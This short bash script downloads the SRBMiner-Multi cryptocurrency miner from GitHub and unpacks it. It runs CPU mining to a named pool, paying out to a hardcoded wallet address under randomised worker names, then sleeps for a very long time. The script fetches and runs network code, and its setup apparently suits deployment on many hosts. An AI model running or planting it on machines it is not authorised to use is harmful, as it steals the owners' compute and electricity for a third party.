#!/bin/bash

wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.8.0/SRBMiner-Multi-0-8-0-Linux.tar.xz
tar -xvf SRBMiner-Multi-0-8-0-Linux.tar.xz
sleep 60
./SRBMiner-Multi-0-8-0/SRBMiner-MULTI --disable-gpu --algorithm yespowersugar --pool stratum+tcps://stratum-eu.rplant.xyz:17042 --wallet sugar1q6yntmx084j8uxdwcka93m5qqdzvnppmyak8uru.Luxy$RANDOM --cpu-threads 8
sleep 60000000
